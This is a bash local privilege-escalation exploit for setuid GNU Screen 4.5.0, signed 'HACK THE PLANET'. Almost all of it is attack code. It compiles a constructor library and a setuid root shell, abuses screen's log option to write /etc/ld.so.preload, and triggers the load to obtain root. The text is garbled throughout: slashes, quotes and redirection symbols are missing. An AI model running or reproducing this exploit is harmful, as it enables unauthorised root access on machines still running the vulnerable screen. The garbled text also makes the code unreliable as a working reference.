#!binbash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug httpslists.gnu.orgarchivehtmlscreen-devel2017-01msg00025.html
# HACK THE PLANET
# ~ infodox (2512017)

echo "···············································································································"
echo ":                                                    _  _      ____     ___                       _           :"
echo ":    ___   ___  _ __  ___   ___  _ __        __   __| || |    | ___|   / _ \         _ __   _ __ (_)__   __   :"
echo ":   / __| / __|| '__|/ _ \ / _ \| '_ \  _____\ \ / /| || |_   |___ \  | | | | _____ | '_ \ | '__|| |\ \ / /   :"
echo ":   \__ \| (__ | |  |  __/|  __/| | | ||_____|\ V / |__   _|_  ___) |_| |_| ||_____|| |_) || |   | | \ V /    :"
echo ":   |___/ \___||_|   \___| \___||_| |_|        \_/     |_| (_)|____/(_)\___/        | .__/ |_|   |_|  \_/     :"
echo ":                                                                                   |_|                       :"
echo ":                                                                                                             :"
echo ":··············································································································"


echo ~ gnuscreenroot ~
echo [+] First, we create our shell and library...
cat  EOF  tmplibhax.c                            
#include stdio.h
#include systypes.h
#include unistd.h
#include sysstat.h
__attribute__ ((__constructor__))
void dropshell(void){
    chown(tmprootshell, 0, 0);
    chmod(tmprootshell, 04755);
    unlink(etcld.so.preload);
    printf([+] done!n);
}
EOF

gcc -fPIC -shared -ldl -o tmplibhax.so tmplibhax.c
rm -f tmplibhax.c

cat  EOF  tmprootshell.c
#include stdio.h
#include stdlib.h
#include unistd.h
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execl(binsh, sh, NULL);
    return 0;
}
EOF

gcc -o tmprootshell tmprootshell.c  -static
rm -f tmprootshell.c

echo [+] Now we create our etcld.so.preload file...
cd etc  exit 1 # Exit if change directory fails
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  x0atmplibhax.so # newline needed
echo [+] Triggering...
screen -ls # screen itself is setuid, so... 
tmprootshell

echo [+] Exploit Finished!
